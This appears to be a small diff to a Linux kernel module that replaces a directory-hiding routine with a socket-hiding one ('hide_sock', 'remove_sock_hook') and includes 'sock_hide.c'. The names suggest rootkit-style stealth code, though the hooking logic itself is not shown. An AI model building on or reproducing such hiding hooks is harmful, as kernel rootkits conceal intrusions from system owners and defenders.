@@ -3,7 +3,7 @@
 #include <linux/kernel.h>
 #include <linux/slab.h>
 #include <linux/kallsyms.h>
-#include "hide.c"
+#include "sock_hide.c"
 
 MODULE_LICENSE("GPL");
 
@@ -16,11 +16,11 @@ int init_module(void) {
 	
 	
 
-	hide_directory();
+	hide_sock();
 	return 0;
 }
 
 
 void cleanup_module(void) {
-	remove_hook();
+	remove_sock_hook();
 }
